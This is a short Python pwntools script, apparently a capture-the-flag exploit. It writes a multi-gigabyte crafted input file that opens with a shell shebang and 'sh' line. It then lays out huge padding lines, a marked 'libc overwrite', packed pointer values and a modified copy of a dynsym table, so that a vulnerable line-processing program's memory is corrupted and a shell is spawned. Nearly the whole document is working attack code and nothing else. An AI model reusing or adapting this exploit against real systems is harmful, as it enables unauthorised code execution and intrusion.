#!/usr/bin/env python3

import sys
from pwn import *
import time

NUM_PATTERNS = (1<<27) # + 2085409
longstr = b'y'*1090519038 # b'y'*2186534896

# need to make the pattern chunk smaller

start = time.time()
print("Making pattern file...")
file = open("patt", "wb")
file.write(b'#!/bin/sh\n')
file.write(b'sh\n')
file.write(longstr)
file.write(b'\n')
print("Starting patterns")
for i in range(NUM_PATTERNS-4):
    file.write(b'a\n')
    if i%1000000 == 0:
        print(f"{i}/{NUM_PATTERNS}")

for i in range(120):
    file.write(b'a'*(1<<17)+b'\n')
file.write(b'a'*((1<<18)+(1<<17) + 50000 + 0x2000)+b'\n')
# file.write(longstr)
file.write(b'AAAA') # libc overwrite
file.write(b'\n')

file.write(b'b\x00'+b'b'*1099358190)
file.write(p64(0))
file.write(p64(0x40af3000|2))
file.write(b'\n')

file.write(b'a'*0xa71000 +b'\n')
file.write(b'a' + b'\x00'*(0x7ffff739b000-0x7fff75aac000-1))
dynsym = open("dynsym.bin", "rb").read()
for c in dynsym:
    if c != 0x0a:
        file.write(bytes([c]))
    else:
        file.write(bytes([0x0b])) # doing a big ol hope here
file.write(b'\n')

file.close()
print("Finished in {:.3f} seconds.".format(time.time()-start))